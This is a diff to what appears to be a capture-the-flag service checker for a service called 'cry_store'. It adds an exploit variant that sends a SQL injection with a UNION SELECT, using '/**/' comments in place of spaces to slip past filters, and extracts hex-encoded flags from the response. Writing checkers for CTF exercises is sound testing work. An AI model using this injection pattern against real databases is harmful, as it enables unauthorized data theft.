@@ -30,10 +30,10 @@ class CryStoreChecker(BaseChecker):
 	(Or read the source, Luke)
 	"""
 
-	flag_variants = 1
-	noise_variants = 1
-	havoc_variants = 0
-	exploit_variants=0
+	flag_variants 	= 1
+	noise_variants	= 1
+	havoc_variants	= 0
+	exploit_variants= 1
 	service_name = "cry_store"
 	port = 9122  # The port will automatically be picked up as default by self.connect and self.http.
 
@@ -268,7 +268,29 @@ class CryStoreChecker(BaseChecker):
 				If nothing is returned, the service status is considered okay.
 				The preferred way to report Errors in the service is by raising an appropriate EnoException
 		"""
-		pass
+
+		if self.variant_id == 0:
+			conn = self.connect()
+			expect_command_prompt(conn)
+			payload="load "
+			payload+=f"-1 UNION SELECT data, id FROM store WHERE category = 'flag' ORDER BY id DESC LIMIT 1\n".replace(' ', '/**/')
+			conn.write(payload.encode())
+
+			flag_candidates = expect_command_prompt(conn)
+			self.info(f"Injection returned: {flag_candidates}")
+			flag_candidates = flag_candidates.split(b"\n")
+			flags = []
+			for flag in flag_candidates: 
+				try:
+					flags.append( unhexlify(flag) )
+				except:
+					pass
+				
+			self.info(f"possible flags: {flags}")
+			flags = b' '.join(flags)
+			return self.search_flag_bytes(flags)
+		else:
+			raise BrokenCheckerException("Invalid variant_id")
 
 def expect_command_prompt(conn):
 	return conn.readline_expect(b'command: ',b'command: ').split(b'command: ')[0] # need colon and space in split?
